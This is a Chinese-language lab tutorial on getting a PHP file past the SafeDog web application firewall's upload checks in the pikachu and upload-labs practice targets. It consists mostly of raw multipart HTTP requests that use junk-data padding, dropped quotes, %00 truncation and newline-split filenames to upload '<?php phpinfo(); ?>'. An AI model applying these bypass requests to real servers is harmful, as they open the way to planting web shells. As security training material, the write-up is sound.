![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627433334141-cb693e43-53e8-4e28-80b9-b2c08e23f2f6.png?x-oss-process=image%2Fresize%2Cw_752%2Cresize%2Cw_752%2Cresize%2Cw_752#from=url&id=JsaOH&originHeight=1203&originWidth=752&originalType=binary&ratio=1&status=done&style=none)<br />**上传参数名解析：明确有哪些东西能修改？**
```bash
Content-Disposition:	一般可更改

name:	表单参数值，不能更改

filename :文件名，可以更改

Content-Type:文件MIME，视情况更改

```
**常见的绕过方法**
```bash
数据溢出-防匹配(xxx.. .)

符号变异-防匹配（'" ;)

数据截断-防匹配(%00 ;换行)

重复数据-防匹配(参数多次)

```
<a name="ds9Ci"></a>
### pikachu+安全狗绕过
[https://www.cnblogs.com/shley/p/14800623.html](https://www.cnblogs.com/shley/p/14800623.html)
<a name="JBDPh"></a>
#### 数据溢出
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898182231-4ded8499-dc64-45ef-bbed-2a583dafb048.png#clientId=uddea3477-8c3f-4&from=paste&height=323&id=ufe9d4c0f&originHeight=645&originWidth=1920&originalType=binary&ratio=1&size=76446&status=done&style=none&taskId=u4eef90c0-87b8-4144-b72f-22845d1a895&width=960)<br />正常上传的情况<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898978466-0def010f-fce2-435b-b92a-ad1e77294d14.png#clientId=uddea3477-8c3f-4&from=paste&height=287&id=ue622e5ea&originHeight=573&originWidth=1920&originalType=binary&ratio=1&size=116761&status=done&style=none&taskId=u52e3ecdf-83da-45af-be3f-8b0c4cf2bf1&width=960)<br />被安全狗拦截的情况<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898889066-ba927953-805b-446e-a0c8-28a8e437dcec.png#clientId=uddea3477-8c3f-4&from=paste&height=337&id=u361dcabd&originHeight=673&originWidth=1916&originalType=binary&ratio=1&size=139759&status=done&style=none&taskId=u8072de7b-d7bc-41b3-b027-9ffcadaf8bc&width=958)<br />修改数据包上传`Content-Disposition: form-data; name="uploadfile";`中间插入大量的垃圾数据从而绕过。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627898527403-03b55f1a-41a2-497a-a53b-61c5259b6895.png#clientId=uddea3477-8c3f-4&from=paste&height=471&id=uc431c63a&originHeight=941&originWidth=1920&originalType=binary&ratio=1&size=99164&status=done&style=none&taskId=u65aa1e76-3123-444f-9735-158a501a03f&width=960)
<a name="mocm2"></a>
#### %00截断
<br />`使用%00截断，添加合法后缀名`<br />格式：文件名.php%00.png<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627899356581-b6e5d1ad-4866-462f-a894-2b8abda1134a.png#clientId=uddea3477-8c3f-4&from=paste&height=296&id=u4cf08697&originHeight=591&originWidth=1920&originalType=binary&ratio=1&size=118604&status=done&style=none&taskId=u3ec903a7-5f96-4227-b680-a6800f18d25&width=960)
<a name="D70ka"></a>
#### 改变符号
去掉双引号
```bash
POST /vul/unsafeupload/servercheck.php HTTP/1.1
Host: 10.1.1.6:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------276594773132894662704244861418
Content-Length: 367
Origin: http://10.1.1.6:88
Connection: close
Referer: http://10.1.1.6:88/vul/unsafeupload/servercheck.php
Cookie: PHPSESSID=e405r8e634hhjk7su64ofmjknl
Upgrade-Insecure-Requests: 1

-----------------------------276594773132894662704244861418
Content-Disposition: form-data;name="uploadfile"; filename=info4.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------276594773132894662704244861418
Content-Disposition: form-data; name="submit"

å¼å§ä¸ä¼ 
-----------------------------276594773132894662704244861418--

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627899546378-8de44e66-4ac0-45dd-bbd1-86be5ef92dde.png#clientId=uddea3477-8c3f-4&from=paste&height=262&id=u8718b380&originHeight=524&originWidth=1918&originalType=binary&ratio=1&size=109953&status=done&style=none&taskId=uc8d9d7ed-dcb9-4d35-937c-429a82494a4&width=959)<br />只使用一个双引号，成功上传文件info5.php
```bash
POST /vul/unsafeupload/servercheck.php HTTP/1.1
Host: 10.1.1.6:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------276594773132894662704244861418
Content-Length: 368
Origin: http://10.1.1.6:88
Connection: close
Referer: http://10.1.1.6:88/vul/unsafeupload/servercheck.php
Cookie: PHPSESSID=e405r8e634hhjk7su64ofmjknl
Upgrade-Insecure-Requests: 1

-----------------------------276594773132894662704244861418
Content-Disposition: form-data;name="uploadfile"; filename="info5.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------276594773132894662704244861418
Content-Disposition: form-data; name="submit"

å¼å§ä¸ä¼ 
-----------------------------276594773132894662704244861418--

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627900010071-761d120d-72a8-4d22-9aa5-53d7add3fdcf.png#clientId=uddea3477-8c3f-4&from=paste&height=304&id=u48232a71&originHeight=607&originWidth=1920&originalType=binary&ratio=1&size=119162&status=done&style=none&taskId=u5b13ae48-56ff-4b5a-84be-167e4055e8e&width=960)
<a name="L9jSI"></a>
### uploads+安全狗绕过

<a name="G0Lsb"></a>
#### 数据溢出
```bash
POST /Pass-06/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------219208409912899756444268510117
Content-Length: 378
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-06/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------219208409912899756444268510117
Content-Disposition: form-data; name="upload_file";填充大量的垃圾数据; filename="info.Php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
-----------------------------219208409912899756444268510117
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------219208409912899756444268510117--

```
<a name="OnGbe"></a>
#### ![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627980254602-e3cf22c4-2dac-4c1d-b793-bf3728666042.png#clientId=ua88b9d30-961d-4&from=paste&height=481&id=ua89a2e69&originHeight=961&originWidth=1920&originalType=binary&ratio=1&size=154536&status=done&style=none&taskId=u0a0de51f-503a-4d51-b471-2622d0e385c&width=960)
<a name="FF3hk"></a>
#### 改变符号
```bash
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 363
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename="info.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627982052482-c5d7fb1b-5ee3-4df5-9fb5-5e445d91c46b.png#clientId=ua88b9d30-961d-4&from=paste&height=445&id=u8464e864&originHeight=889&originWidth=1916&originalType=binary&ratio=1&size=139782&status=done&style=none&taskId=u7e890c61-2edd-4622-bc45-2feed622902&width=958)
```bash
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 362
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename=info.php
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627982302049-a76640e6-9969-4c9a-9f1c-520dcc812888.png#clientId=ua88b9d30-961d-4&from=paste&height=472&id=u0dcd5ddb&originHeight=944&originWidth=1913&originalType=binary&ratio=1&size=160592&status=done&style=none&taskId=u05efe4df-f9a9-4ab8-842f-78f9b4b64a0&width=956.5)<br /> 
<a name="MWyYF"></a>
#### %00截断
```bash
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 371
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename="info.php%00.png"
Content-Type: image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627982478279-2d122c5a-3e1b-4a16-9abe-9f27d6625309.png#clientId=ua88b9d30-961d-4&from=paste&height=521&id=uee1a95a4&originHeight=1042&originWidth=1920&originalType=binary&ratio=1&size=175267&status=done&style=none&taskId=u9ec886e1-73bf-46a8-bed9-505fc02dbf7&width=960)
<a name="EeKd1"></a>
#### 换行执行
```bash
POST /Pass-02/index.php?action=show_code HTTP/1.1
Host: 10.1.1.6
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------156187617541967037312717027348
Content-Length: 368
Origin: http://10.1.1.6
Connection: close
Referer: http://10.1.1.6/Pass-02/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="upload_file"; filename="x.
p
h
p"
Content-Type:  image/jpeg

<?php phpinfo(); ?>
-----------------------------156187617541967037312717027348
Content-Disposition: form-data; name="submit"

涓婁紶
-----------------------------156187617541967037312717027348--

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627983630181-bbbbd04f-c725-4602-ad9a-b00ed4af96e2.png#clientId=ua88b9d30-961d-4&from=paste&height=395&id=u89ea6265&originHeight=790&originWidth=1920&originalType=binary&ratio=1&size=143780&status=done&style=none&taskId=u2c7e4db0-17be-4df3-a217-e583a618720&width=960)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1627983668780-3be76f4f-6d9b-4be9-86e8-8fe85e7f63f2.png#clientId=ua88b9d30-961d-4&from=paste&id=u9b273c9a&originHeight=480&originWidth=1141&originalType=binary&ratio=1&size=39767&status=done&style=none&taskId=ucde4e289-da99-4028-9b59-600b8fdd039)

<a name="JTDoO"></a>
### fuzz字典
[https://github.com/fuzzdb-project/fuzzdb](https://github.com/fuzzdb-project/fuzzdb)<br />[https://github.com/TheKingOfDuck/fuzzDicts](https://github.com/TheKingOfDuck/fuzzDicts)<br />[https://github.com/TuuuNya/fuzz_dict](https://github.com/TuuuNya/fuzz_dict)<br />[https://github.com/jas502n/fuzz-wooyun-org](https://github.com/jas502n/fuzz-wooyun-org)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131120768-8674e0d4-a903-4157-8880-7b5628723acf.png#clientId=u82012114-37f1-4&from=paste&height=341&id=u5ea1d4e9&originHeight=681&originWidth=1920&originalType=binary&ratio=1&size=102722&status=done&style=none&taskId=u94f0c718-26e1-44ee-a199-4c922bcf322&width=960)![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131140667-28bd0d61-7533-43a2-97b9-9f94a26e6358.png#clientId=u82012114-37f1-4&from=paste&height=390&id=u37c76862&originHeight=779&originWidth=1920&originalType=binary&ratio=1&size=77847&status=done&style=none&taskId=u2150f211-81a9-44d7-8a2a-841708cbf4b&width=960)![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131148142-d724fc44-a0c7-4f7e-9871-4c49b2c665d3.png#clientId=u82012114-37f1-4&from=paste&id=u1cd73428&originHeight=791&originWidth=1051&originalType=binary&ratio=1&size=69532&status=done&style=none&taskId=uf48732d5-2d4e-4636-9aeb-a4a97b22567)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628131194773-e18311c0-8b2a-4761-8674-3e5dba51e24a.png#clientId=u82012114-37f1-4&from=paste&height=370&id=uf44742fb&originHeight=739&originWidth=1094&originalType=binary&ratio=1&size=114601&status=done&style=none&taskId=uf66dfa0f-8f8e-442c-b3ba-f939c5e9ebe&width=547)
